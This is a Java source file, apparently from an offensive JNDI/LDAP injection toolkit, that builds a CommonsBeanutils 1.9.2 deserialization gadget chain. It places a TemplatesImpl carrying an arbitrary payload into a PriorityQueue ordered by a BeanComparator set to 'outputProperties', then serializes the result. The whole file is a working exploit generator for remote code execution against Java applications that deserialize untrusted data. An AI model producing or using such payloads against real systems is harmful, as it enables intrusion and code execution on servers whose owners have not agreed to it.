package com.feihong.ldap.gadgets;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Gadgets;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.feihong.ldap.gadgets.utils.Reflections.setFieldValue;

public class CommonsBeanutils192WithoutCC {
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, param);
        // mock method name until armed
//        MyURLClassLoader classLoader = new MyURLClassLoader("commons-beanutils-1.9.2.jar");
//        Class clazz = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
//        Object comparator = clazz.getDeclaredConstructor(new Class[]{String.class, java.util.Comparator.class}).newInstance(new Object[]{null, String.CASE_INSENSITIVE_ORDER});

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);


        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,  (Comparator<? super Object>) comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});


        byte[] bytes = object2Bytes(queue);

        return bytes;
    }

    private static byte[] object2Bytes(Object obj) throws IOException {
        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(obj);
        byte[] bytes = baous.toByteArray();
        oos.close();
        return bytes;
    }
}
